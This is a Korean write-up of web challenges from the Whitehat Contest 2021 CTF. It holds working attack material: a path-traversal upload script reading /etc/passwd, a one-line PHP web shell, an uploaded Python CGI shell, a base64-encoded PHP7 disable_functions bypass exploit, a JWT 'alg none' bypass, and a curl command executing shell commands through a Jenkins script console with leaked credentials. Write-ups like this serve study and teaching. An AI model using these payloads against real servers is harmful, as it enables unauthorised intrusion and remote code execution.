---
title: "2021 화이트햇콘테스트 웹 분야 Writeup"
description: "2021 화이트햇콘테스트 예선 웹 문제 풀이 - Imageflare, mudbox, mini-realworld"
date: 2021-10-20
tags: ["whitehat", "file-upload", "path-traversal", "php"]
ctf: "Whitehat Contest 2021"
published: true
---

## Imageflare (v1)


files = { 'file':('..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', f, 'image/png') }


위와같이file name을구성함으로써file download가가능해진다


```
from arang import *
import re,sys

def dopow(x):
	for i in range(0,10000000):
		if hexencode(sha1(str(i)))[:5] == x:
			return i
	return 'false'

fname = urlencode(f"../../../../../../../../../../../../{sys.argv[1]}").replace("/","%2f")

u = 'http://imageflare-v2.eyes-on.me/index.php'
headers = {
	'Cookie' : 'PHPSESSID=kbjdpdq19mrb40hqvf78ruov6e'
}
proxies = {"https":"https://127.0.0.1:8888/", "http":"http://127.0.0.1:8888/"}

r = requests.get(u, headers=headers, verify=False)
powvalue = r.content.decode().split('PoW: Solve <code>sha1(x)[:5] == ')[1].split('</code>')[0]
print(powvalue)

f = open(r"D:\jw\tmp\a.png", 'rb')
print(fname)
files = {
	'file':(fname, f, 'image/png')
}

data = {"pow":dopow(powvalue.encode()), "upload":"제출"}


u = 'http://imageflare-v2.eyes-on.me/file_up.php'
r = requests.post(u, data=data, headers=headers, files=files, verify=False)
print(r.content)

u = 'http://imageflare-v2.eyes-on.me/index.php'
r = requests.get(u, headers=headers, verify=False)

rr = r.content.decode()

matches = re.findall("./download.php\\?sig=[0-9a-f]{32}\">.+</a>", rr)
for i in matches:
	print(i)

sig = matches[-1].split('sig=')[1].split('"')[0]
print(sig)
r = requests.get(f"http://imageflare-v2.eyes-on.me/download.php?sig={sig}", headers=headers, verify=False)
print(r.content.decode())
```


File download자동화스크립트를짰다


![image](/images/writeups/whitehat-2021-web_c8765417.png)


![image](/images/writeups/whitehat-2021-web_b805fec1.png)


<?=`$_GET[c]`?>가담긴jpg를업로드


그러면나타난시그니처_파일명이/uploads/디렉터리밑에저장되기때문에직접접근하면쉘을얻을수있다


![image](/images/writeups/whitehat-2021-web_d2df602f.png)


---


## Imageflare v2


앞부분은 v1과 동일하다


![image](/images/writeups/whitehat-2021-web_5a428ba0.png)


python으로작성된cgi파일을../cgi-bin/arang911.py로업로드하였다


```
#!/usr/bin/python3.6
import cgi
import os
print("Content-type: text/html;\n")
print(os.popen("ls -l /").read())
print(os.popen("cat /reveeeeeeeeeeenge_flag").read())
#define width 10000
#define height 10000
```


![image](/images/writeups/whitehat-2021-web_4ddb68d1.png)


#define을통해xbm은image size를parsing하기때문에getimagesize우회된다. (위 사진은 xbm을 파싱하는 php 소스코드)


![image](/images/writeups/whitehat-2021-web_1be4bf9f.png)


Realip를알아야cloudflare뒷단에직접접근이가능한데,이는Sublist3r도구를통해나오는도메인으로알게되었다.


![image](/images/writeups/whitehat-2021-web_561ce045.png)


어쨌든 cgi로 임의 명령 실행이 가능하다


---


## mudbox


![image](/images/writeups/whitehat-2021-web_58a1bcad.png)


pht가 뚫려있다


![image](/images/writeups/whitehat-2021-web_81a882d8.png)


php파일 만드는 친구를 올리고 실행


![image](/images/writeups/whitehat-2021-web_180183ac.png)


맘대로 실행할수 있는php가 생겼다


![image](/images/writeups/whitehat-2021-web_50b62b6b.png)


disable_functions가 걸려있으니 우회하기 위해1day exploit을 찾아보면,


[https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)2020년에 발견된게 있다.


![image](/images/writeups/whitehat-2021-web_530c1d48.png)


현재php버전이7.2.24니까docker받아서 로컬테스트해보면 익스가 잘 되는것을 알 수 있다.


```
from arang import *
import re,sys,time

ex = urlencode('''PD9waHANCg0KcHduKCIkX0dFVFtjY2NdIik7DQoNCmZ1bmN0aW9uIHB3bigkY21kKSB7DQogICAgZ2xvYmFsICRhYmMsICRoZWxwZXIsICRiYWNrdHJhY2U7DQoNCiAgICBjbGFzcyBWdWxuIHsNCiAgICAgICAgcHVibGljICRhOw0KICAgICAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpIHsgDQogICAgICAgICAgICBnbG9iYWwgJGJhY2t0cmFjZTsgDQogICAgICAgICAgICB1bnNldCgkdGhpcy0+YSk7DQogICAgICAgICAgICAkYmFja3RyYWNlID0gKG5ldyBFeGNlcHRpb24pLT5nZXRUcmFjZSgpOyANCiAgICAgICAgICAgIGlmKCFpc3NldCgkYmFja3RyYWNlWzFdWydhcmdzJ10pKSB7DQogICAgICAgICAgICAgICAgJGJhY2t0cmFjZSA9IGRlYnVnX2JhY2t0cmFjZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgY2xhc3MgSGVscGVyIHsNCiAgICAgICAgcHVibGljICRhLCAkYiwgJGMsICRkOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHN0cjJwdHIoJiRzdHIsICRwID0gMCwgJHMgPSA4KSB7DQogICAgICAgICRhZGRyZXNzID0gMDsNCiAgICAgICAgZm9yKCRqID0gJHMtMTsgJGogPj0gMDsgJGotLSkgew0KICAgICAgICAgICAgJGFkZHJlc3MgPDw9IDg7DQogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCskal0pOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYWRkcmVzczsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBwdHIyc3RyKCRwdHIsICRtID0gOCkgew0KICAgICAgICAkb3V0ID0gIiI7DQogICAgICAgIGZvciAoJGk9MDsgJGkgPCAkbTsgJGkrKykgew0KICAgICAgICAgICAgJG91dCAuPSBjaHIoJHB0ciAmIDB4ZmYpOw0KICAgICAgICAgICAgJHB0ciA+Pj0gODsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG91dDsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiB3cml0ZSgmJHN0ciwgJHAsICR2LCAkbiA9IDgpIHsNCiAgICAgICAgJGkgPSAwOw0KICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRuOyAkaSsrKSB7DQogICAgICAgICAgICAkc3RyWyRwICsgJGldID0gY2hyKCR2ICYgMHhmZik7DQogICAgICAgICAgICAkdiA+Pj0gODsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIGxlYWsoJGFkZHIsICRwID0gMCwgJHMgPSA4KSB7DQogICAgICAgIGdsb2JhbCAkYWJjLCAkaGVscGVyOw0KICAgICAgICB3cml0ZSgkYWJjLCAweDY4LCAkYWRkciArICRwIC0gMHgxMCk7DQogICAgICAgICRsZWFrID0gc3RybGVuKCRoZWxwZXItPmEpOw0KICAgICAgICBpZigkcyAhPSA4KSB7ICRsZWFrICU9IDIgPDwgKCRzICogOCkgLSAxOyB9DQogICAgICAgIHJldHVybiAkbGVhazsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsNCiAgICAgICAgJGVfdHlwZSA9IGxlYWsoJGJhc2UsIDB4MTAsIDIpOw0KDQogICAgICAgICRlX3Bob2ZmID0gbGVhaygkYmFzZSwgMHgyMCk7DQogICAgICAgICRlX3BoZW50c2l6ZSA9IGxlYWsoJGJhc2UsIDB4MzYsIDIpOw0KICAgICAgICAkZV9waG51bSA9IGxlYWsoJGJhc2UsIDB4MzgsIDIpOw0KDQogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJGVfcGhudW07ICRpKyspIHsNCiAgICAgICAgICAgICRoZWFkZXIgPSAkYmFzZSArICRlX3Bob2ZmICsgJGkgKiAkZV9waGVudHNpemU7DQogICAgICAgICAgICAkcF90eXBlICA9IGxlYWsoJGhlYWRlciwgMCwgNCk7DQogICAgICAgICAgICAkcF9mbGFncyA9IGxlYWsoJGhlYWRlciwgNCwgNCk7DQogICAgICAgICAgICAkcF92YWRkciA9IGxlYWsoJGhlYWRlciwgMHgxMCk7DQogICAgICAgICAgICAkcF9tZW1zeiA9IGxlYWsoJGhlYWRlciwgMHgyOCk7DQoNCiAgICAgICAgICAgIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA2KSB7IA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRkYXRhX2FkZHIgPSAkZV90eXBlID09IDIgPyAkcF92YWRkciA6ICRiYXNlICsgJHBfdmFkZHI7DQogICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9ICRwX21lbXN6Ow0KICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7IA0KICAgICAgICAgICAgICAgICR0ZXh0X3NpemUgPSAkcF9tZW1zejsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07DQogICAgfQ0KDQogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7DQogICAgICAgIGxpc3QoJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZSkgPSAkZWxmOw0KICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRkYXRhX3NpemUgLyA4OyAkaSsrKSB7DQogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsNCiAgICAgICAgICAgIGlmKCRsZWFrIC0gJGJhc2UgPiAwICYmICRsZWFrIC0gJGJhc2UgPCAkZGF0YV9hZGRyIC0gJGJhc2UpIHsNCiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3NDZlNjE3NDczNmU2ZjYzKQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsNCg0KICAgICAgICAgICAgJGxlYWsgPSBsZWFrKCRkYXRhX2FkZHIsICgkaSArIDQpICogOCk7DQogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7DQogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYoJGRlcmVmICE9IDB4Nzg2NTY4MzI2ZTY5NjIpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOw0KDQogICAgICAgICAgICByZXR1cm4gJGRhdGFfYWRkciArICRpICogODsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsNCiAgICAgICAgJGJhc2UgPSAwOw0KICAgICAgICAkc3RhcnQgPSAkYmluYXJ5X2xlYWsgJiAweGZmZmZmZmZmZmZmZmYwMDA7DQogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7DQogICAgICAgICAgICAkYWRkciA9ICRzdGFydCAtIDB4MTAwMCAqICRpOw0KICAgICAgICAgICAgJGxlYWsgPSBsZWFrKCRhZGRyLCAwLCA3KTsNCiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyANCiAgICAgICAgICAgICAgICByZXR1cm4gJGFkZHI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgew0KICAgICAgICAkYWRkciA9ICRiYXNpY19mdW5jczsNCiAgICAgICAgZG8gew0KICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsNCiAgICAgICAgICAgICRmX25hbWUgPSBsZWFrKCRmX2VudHJ5LCAwLCA2KTsNCg0KICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyANCiAgICAgICAgICAgICAgICByZXR1cm4gbGVhaygkYWRkciArIDgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsNCiAgICAgICAgfSB3aGlsZSgkZl9lbnRyeSAhPSAwKTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHRyaWdnZXJfdWFmKCRhcmcpIHsNCiAgICAgICAgDQogICAgICAgICRhcmcgPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsNCiAgICAgICAgJHZ1bG4gPSBuZXcgVnVsbigpOw0KICAgICAgICAkdnVsbi0+YSA9ICRhcmc7DQogICAgfQ0KDQogICAgaWYoc3RyaXN0cihQSFBfT1MsICdXSU4nKSkgew0KICAgICAgICBkaWUoJ1RoaXMgUG9DIGlzIGZvciAqbml4IHN5c3RlbXMgb25seS4nKTsNCiAgICB9DQoNCiAgICAkbl9hbGxvYyA9IDEwOyANCiAgICAkY29udGlndW91cyA9IFtdOw0KICAgIGZvcigkaSA9IDA7ICRpIDwgJG5fYWxsb2M7ICRpKyspDQogICAgICAgICRjb250aWd1b3VzW10gPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsNCg0KICAgIHRyaWdnZXJfdWFmKCd4Jyk7DQogICAgJGFiYyA9ICRiYWNrdHJhY2VbMV1bJ2FyZ3MnXVswXTsNCg0KICAgICRoZWxwZXIgPSBuZXcgSGVscGVyOw0KICAgICRoZWxwZXItPmIgPSBmdW5jdGlvbiAoJHgpIHsgfTsNCg0KICAgIGlmKHN0cmxlbigkYWJjKSA9PSA3OSB8fCBzdHJsZW4oJGFiYykgPT0gMCkgew0KICAgICAgICBkaWUoIlVBRiBmYWlsZWQiKTsNCiAgICB9DQoNCiAgICANCiAgICAkY2xvc3VyZV9oYW5kbGVycyA9IHN0cjJwdHIoJGFiYywgMCk7DQogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsNCiAgICAkYWJjX2FkZHIgPSAkcGhwX2hlYXAgLSAweGM4Ow0KDQogICAgDQogICAgd3JpdGUoJGFiYywgMHg2MCwgMik7DQogICAgd3JpdGUoJGFiYywgMHg3MCwgNik7DQoNCiAgICANCiAgICB3cml0ZSgkYWJjLCAweDEwLCAkYWJjX2FkZHIgKyAweDYwKTsNCiAgICB3cml0ZSgkYWJjLCAweDE4LCAweGEpOw0KDQogICAgJGNsb3N1cmVfb2JqID0gc3RyMnB0cigkYWJjLCAweDIwKTsNCg0KICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOw0KICAgIGlmKCEoJGJhc2UgPSBnZXRfYmluYXJ5X2Jhc2UoJGJpbmFyeV9sZWFrKSkpIHsNCiAgICAgICAgZGllKCJDb3VsZG4ndCBkZXRlcm1pbmUgYmluYXJ5IGJhc2UgYWRkcmVzcyIpOw0KICAgIH0NCg0KICAgIGlmKCEoJGVsZiA9IHBhcnNlX2VsZigkYmFzZSkpKSB7DQogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOw0KICAgIH0NCg0KICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsNCiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgYmFzaWNfZnVuY3Rpb25zIGFkZHJlc3MiKTsNCiAgICB9DQoNCiAgICBpZighKCR6aWZfc3lzdGVtID0gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpKSkgew0KICAgICAgICBkaWUoIkNvdWxkbid0IGdldCB6aWZfc3lzdGVtIGFkZHJlc3MiKTsNCiAgICB9DQoNCiAgICANCiAgICAkZmFrZV9vYmpfb2Zmc2V0ID0gMHhkMDsNCiAgICBmb3IoJGkgPSAwOyAkaSA8IDB4MTEwOyAkaSArPSA4KSB7DQogICAgICAgIHdyaXRlKCRhYmMsICRmYWtlX29ial9vZmZzZXQgKyAkaSwgbGVhaygkY2xvc3VyZV9vYmosICRpKSk7DQogICAgfQ0KDQogICAgDQogICAgd3JpdGUoJGFiYywgMHgyMCwgJGFiY19hZGRyICsgJGZha2Vfb2JqX29mZnNldCk7DQogICAgd3JpdGUoJGFiYywgMHhkMCArIDB4MzgsIDEsIDQpOyANCiAgICB3cml0ZSgkYWJjLCAweGQwICsgMHg2OCwgJHppZl9zeXN0ZW0pOyANCg0KICAgICgkaGVscGVyLT5iKSgkY21kKTsNCiAgICBleGl0KCk7DQp9''')

u = 'http://3.38.109.135:28344/data/72ced1fa15db322c3c900cba8f15cf46/test.php?c=echo%20file_put_contents(%27/tmp/arang101%27,file_get_contents(%27/tmp/arang101%27)."{}");'

for i in range(0,len(ex),1000):
	r = requests.get(u.format(ex[i:i+1000]))
	time.sleep(1)
```


대강 서버에 업로드 한 후


```
file_put_contents("ex.php",str_replace("\r\n","\n",base64_decode(file_get_contents("/tmp/arang101"))));
```


이런식으로 현재경로로 익스코드를 가져온다


이후 접근하면


![image](/images/writeups/whitehat-2021-web_f1463805.png)


웹쉘 업로드 가능


---


## mini-realworld


첨에는 제공된react코드좀 보다가 무지성algo none바꿔치기 했는데 로그인이 되어버렸다.


![image](/images/writeups/whitehat-2021-web_225da2fe.png)


Nickname인Whitehat-NowYouSeeMe를github에 검색해봤다.


![image](/images/writeups/whitehat-2021-web_97032c9a.png)


ㄷㄷㄷ


![image](/images/writeups/whitehat-2021-web_fdbbdf6f.png)


ㄷㄷㄷㄷㄷㄷㄷ


![image](/images/writeups/whitehat-2021-web_7ee63fd0.png)


s3cret ㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷ


![image](/images/writeups/whitehat-2021-web_292532b5.png)


젠킨스 ㄷㄷㄷㄷㄷㄷ 9999 ㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷ


![image](/images/writeups/whitehat-2021-web_1dae516b.png)


찐킨스 9999포트 ㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷㄷ


![image](/images/writeups/whitehat-2021-web_c2a7dfab.png)


key와 아까 얻은nickname으로remote access해보면 결과가 잘 나온다.


[https://beaglesecurity.com/blog/domectf2020/timezone-writeup.html](https://beaglesecurity.com/blog/domectf2020/timezone-writeup.html)


[https://www.jenkins.io/doc/book/managing/script-console/](https://www.jenkins.io/doc/book/managing/script-console/)


[https://stackoverflow.com/questions/159148/groovy-executing-shell-commands](https://stackoverflow.com/questions/159148/groovy-executing-shell-commands)


위에거 링크들 참조해서 했다


/script에 우선 접근 후script run날렸을때 실제 날아가는 패킷 잡아서 변조했다.


```
curl --data "script=def+proc+%3D+%22ls -alR /%22.execute%28%29%0D%0Adef+b+%3D+new+StringBuffer%28%29%0D%0Aproc.consumeProcessErrorStream%28b%29%0D%0A%0D%0Aprintln+proc.text%0D%0Aprintln+b.toString%28%29&Jenkins-Crumb=3aa12ac3ad49ab60ee63b3fdf4d5ba4d4978eacfb5785753ff0fb6fa69a4ba3c&json=%7B%22script%22%3A+%22def+proc+%3D+%5C%22ls+-al+%2F%5C%22.execute%28%29%5Cndef+b+%3D+new+StringBuffer%28%29%5Cnproc.consumeProcessErrorStream%28b%29%5Cn%5Cnprintln+proc.text%5Cnprintln+b.toString%28%29%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%223aa12ac3ad49ab60ee63b3fdf4d5ba4d4978eacfb5785753ff0fb6fa69a4ba3c%22%7D&Submit=Run" -X POST http://Whitehat-NowYouSeeMe:11d5eb71408ae9b0e4a6219ce9a4aa1767@3.37.166.114:9999/script -i > out.txt;cat out.txt|grep FLAG -B5 -A5
```


![image](/images/writeups/whitehat-2021-web_6d1fa813.png)


플래그 획득